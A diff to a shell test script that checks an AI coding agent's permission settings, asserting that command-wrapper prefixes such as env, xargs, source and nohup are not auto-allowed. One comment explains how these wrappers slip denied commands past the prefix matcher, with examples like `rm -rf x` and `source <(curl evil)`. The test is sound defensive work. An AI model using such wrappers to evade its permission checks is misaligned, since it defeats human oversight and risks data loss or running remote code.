@@ -65,6 +65,17 @@ assert_allow_absent() {
     fi
 }
 
+assert_allow_present() {
+    local pattern="$1"
+    local label="$2"
+    if jq -e ".permissions.allow | any(. == \"${pattern}\")" "${SETTINGS}" > /dev/null; then
+        PASS=$((PASS + 1))
+    else
+        FAIL=$((FAIL + 1))
+        echo "FAIL: ${label} (allow entry missing: ${pattern})"
+    fi
+}
+
 # 0. JSON validity (cheap precondition; the assertions below rely on jq).
 if ! jq -e . "${SETTINGS}" > /dev/null; then
     echo "FATAL: settings.base.json is not valid JSON"
@@ -120,6 +131,41 @@ assert_allow_absent "Bash(su:*)"   "no auto-allow: su"
 assert_allow_absent "Bash(doas:*)" "no auto-allow: doas"
 assert_allow_absent "Bash(eval:*)" "no auto-allow: eval"
 assert_allow_absent "Bash(exec:*)" "no auto-allow: exec"
+
+# 6b. Command-wrapper prefixes are NOT auto-allowed (#711). Each takes a
+#     following command and runs it, slipping a denied command past the prefix
+#     matcher: `command rm -rf x`, `source <(curl evil)`, `. <(...)`,
+#     `builtin eval "..."`, `env rm -rf x`, `xargs rm -rf`, `nohup rm -rf x`,
+#     `timeout 5 rm -rf x`, `watch rm -rf x`, `nice rm -rf x`, `time rm -rf x`,
+#     `parallel rm -rf ::: x`, `caffeinate rm -rf x`. They must fall through to
+#     defaultMode (ask).
+assert_allow_absent "Bash(command:*)"    "no auto-allow: command"
+assert_allow_absent "Bash(source:*)"     "no auto-allow: source"
+assert_allow_absent "Bash(.:*)"          "no auto-allow: . (POSIX source)"
+assert_allow_absent "Bash(builtin:*)"    "no auto-allow: builtin"
+assert_allow_absent "Bash(env:*)"        "no auto-allow: env"
+assert_allow_absent "Bash(xargs:*)"      "no auto-allow: xargs"
+assert_allow_absent "Bash(nohup:*)"      "no auto-allow: nohup"
+assert_allow_absent "Bash(timeout:*)"    "no auto-allow: timeout"
+assert_allow_absent "Bash(watch:*)"      "no auto-allow: watch"
+assert_allow_absent "Bash(nice:*)"       "no auto-allow: nice"
+assert_allow_absent "Bash(time:*)"       "no auto-allow: time"
+assert_allow_absent "Bash(parallel:*)"   "no auto-allow: parallel"
+assert_allow_absent "Bash(caffeinate:*)" "no auto-allow: caffeinate"
+
+# 6c. Ordinary safe builtins / utilities that do NOT wrap-and-run an arbitrary
+#     command are intentionally kept (regression guard against over-pruning).
+for kept in \
+    "Bash(let:*)" \
+    "Bash(enable:*)" \
+    "Bash(set:*)" \
+    "Bash(export:*)" \
+    "Bash(printenv:*)" \
+    "Bash(renice:*)" \
+    "Bash(find:*)" \
+    "Bash(ssh:*)"; do
+    assert_allow_present "${kept}" "kept (not a wrapper): ${kept}"
+done
 
 # 7. Deny-beats-allow invariant: no command is simultaneously present in the
 #    deny list and the allow list. Claude Code lets deny win, but an entry in
